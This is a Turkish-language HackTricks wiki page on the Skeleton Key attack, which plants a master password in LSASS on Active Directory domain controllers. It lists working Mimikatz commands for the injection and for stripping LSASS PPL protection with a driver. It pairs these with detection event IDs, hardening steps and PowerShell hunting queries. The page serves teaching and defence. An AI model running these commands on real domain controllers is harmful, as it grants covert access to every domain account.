# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack**, her etki alanı denetleyicisinin LSASS sürecine bir **master password** enjekte ederek saldırganların **Active Directory authentication** işlemini **bypass** etmesini sağlayan bir tekniktir. Enjeksiyondan sonra, kullanıcıların gerçek parolaları çalışmaya devam ederken **master password** (varsayılan olarak **`mimikatz`**) herhangi bir domain kullanıcısı olarak authentication gerçekleştirmek için kullanılabilir.<sup>[[1]](#references)[[2]](#references)</sup>

Temel bilgiler:

- Her DC üzerinde **Domain Admin/SYSTEM + SeDebugPrivilege** gerektirir ve **her reboot sonrasında yeniden uygulanmalıdır**.<sup>[[2]](#references)</sup>
- Klasik Mimikatz implementation'ı **NTLM** ve **Kerberos RC4 (etype 0x17)** doğrulama yollarına patch uygular; yalnızca AES kullanan authentication, RC4 hook'u üzerinden bu skeleton password'ü **kabul etmez**.<sup>[[2]](#references)</sup>
- Üçüncü taraf LSA authentication package'ları veya ek smart-card / MFA provider'larıyla çakışabilir.<sup>[[2]](#references)</sup>
- Mimikatz modülü, uyumluluk sorunları durumunda Kerberos/AES hook'larına dokunmamak için isteğe bağlı `/letaes` switch'ini kabul eder.<sup>[[3]](#references)</sup>

### Çalıştırma

Klasik, PPL tarafından korunmayan LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Eğer **LSASS protected process light (PPL)** olarak çalışıyorsa, user-mode debug erişimi engellenir. Aşağıdaki historical Mimikatz prosedürü, LSASS'e patch uygulamadan önce kernel driver'ını yükler ve korumayı kaldırır. Credential Guard ayrı bir isolation control'dür ve PPL ile eş anlamlı olarak kullanılmamalıdır.<sup>[[3]](#references)[[4]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Injection işleminden sonra herhangi bir domain hesabıyla, ancak `mimikatz` parolasını (veya operator tarafından ayarlanan değeri) kullanarak authenticate olun. Multi-DC ortamlarında işlemi **tüm DC'lerde** tekrarlamayı unutmayın.

## Mitigations

- **Log monitoring**
- İmzasız driver'lar (ör. `mimidrv.sys`) için System **Event ID 7045** (service/driver install).
- **Sysmon**: `mimidrv.sys` için Event ID 7 (driver load); system dışı process'lerden `lsass.exe` dosyasına yapılan şüpheli erişimler için Event ID 10.
- Hassas privilege kullanımı veya LSA authentication package registration anomalileri için Security **Event ID 4673/4611**; DC'lerden RC4 (etype 0x17) kullanılarak gerçekleştirilen beklenmeyen 4624 logon'ları ile korelasyon yapın.
- **LSASS'i hardening etme**
- Desteklenen yerlerde **RunAsPPL** ve **Credential Guard** özelliklerini etkin tutun. Farklı korumalar sağlar ve birlikte, LSASS secrets'larını değiştirme veya çıkarma girişimlerinin maliyetini ve telemetry miktarını artırırlar.<sup>[[4]](#references)</sup>
- Mümkün olduğunda eski **RC4** desteğini devre dışı bırakın; yalnızca AES ile sınırlanan Kerberos ticket'ları, skeleton key tarafından kullanılan RC4 hook yolunu engeller.<sup>[[2]](#references)</sup>
- Hızlı PowerShell hunts:
- İmzasız kernel driver kurulumlarını tespit edin: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Mimikatz driver'ını arayın: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Reboot sonrasında PPL'nin enforced olduğunu doğrulayın: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Ek credential-hardening rehberliği için [Windows credentials protections](../stealing-credentials/credentials-protections.md) sayfasına bakın.

## References

- [1] [Netwrix – Active Directory'de Skeleton Key saldırısı (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Mimikatz misc::skeleton module'ü](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
- [4] [Microsoft Learn — Eklenen LSA protection'ı yapılandırma](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
